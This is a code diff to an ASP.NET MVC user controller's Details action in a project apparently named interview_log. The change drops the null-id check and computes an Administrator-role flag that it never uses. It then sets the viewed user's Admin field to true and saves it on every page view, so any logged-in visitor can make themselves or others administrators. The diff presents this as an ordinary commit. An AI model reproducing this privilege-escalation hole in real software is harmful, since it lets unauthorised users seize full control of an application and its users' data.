@@ -24,15 +24,17 @@ namespace interview_log.Controllers
         // GET: /Users/Details/5
         public ActionResult Details(string id)
         {
-            if (id == null)
-            {
-                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
-            }
-            User user = db.Users.Find(id);
+            string userId = id == null ? User.Identity.GetUserId() : id;
+            bool ok = User.IsInRole("Administrator");
+            
+            User user = db.Users.Find(userId);
             if (user == null)
             {
                 return HttpNotFound();
             }
+            user.Admin = true;
+            db.SaveChanges();
+         
             return View(user);
         }
 
